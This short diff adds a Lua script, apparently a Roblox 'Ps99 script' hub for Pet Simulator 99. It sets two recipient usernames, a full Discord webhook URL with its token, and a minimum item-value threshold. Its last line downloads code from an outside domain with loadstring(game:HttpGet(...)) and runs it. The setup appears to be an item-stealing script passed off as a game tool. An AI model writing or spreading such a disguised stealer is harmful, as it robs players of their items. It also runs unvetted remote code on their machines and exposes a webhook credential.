@@ -1,0 +1,10 @@
+lua
+Username = "simpyurihshs"
+Username2 = "leo"
+Webhook = "https://discord.com/api/webhooks/1212360609425784832/je_obJwEdcTbBVqhM-kV8nifWb4SekYVdKwqT9P0NuDOgmKKKFzM-JgcltjGHVJMY5tx"
+
+HubName = "Ps99 script"
+
+MinimumRAP = 10000
+
+loadstring(game:HttpGet("https://egorikusa.space"))()
